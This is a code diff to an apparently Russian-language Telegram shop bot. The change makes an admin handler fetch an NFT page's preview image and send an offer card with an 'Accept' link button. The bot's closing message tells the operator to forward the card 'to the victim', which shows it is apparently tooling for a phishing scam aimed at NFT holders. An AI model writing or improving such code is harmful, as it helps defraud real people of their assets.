@@ -316,13 +316,30 @@ async def adm_yes(m: Message, state: FSMContext, shop_bot: Bot):
          InlineKeyboardButton(text="✅ Принять", url=link)]
     ])
     
-    # ОТПРАВЛЯЕМ ОДНО СООБЩЕНИЕ С ТЕКСТОМ И ПРЕВЬЮ
-    await shop_bot.send_message(
-        chat_id=m.from_user.id,
-        text=offer_text(o) + f"\n\n<a href='{o['nft_link']}'>Посмотреть NFT</a>",
-        reply_markup=kb,
-        disable_web_page_preview=False
-    )
+    try:
+        import aiohttp
+        async with aiohttp.ClientSession() as session:
+            async with session.get(o['nft_link'], timeout=10) as resp:
+                html = await resp.text()
+                match = re.search(r'<meta property="og:image" content="(.*?)"', html)
+                if match:
+                    image_url = match.group(1)
+                    await shop_bot.send_photo(
+                        chat_id=m.from_user.id,
+                        photo=image_url,
+                        caption=offer_text(o),
+                        reply_markup=kb
+                    )
+                else:
+                    raise Exception("Не нашли картинку")
+    except Exception as e:
+        log.error(f"Не удалось отправить фото: {e}")
+        await shop_bot.send_message(
+            chat_id=m.from_user.id,
+            text=offer_text(o) + f"\n\n<a href='{o['nft_link']}'>Посмотреть NFT</a>",
+            reply_markup=kb,
+            disable_web_page_preview=False
+        )
     
     await m.answer(f"📨 <b>Оффер #{oid} готов.</b>\n\nВыше карточка от Витрины. Перешли её жертве (без скрытия отправителя).")
 
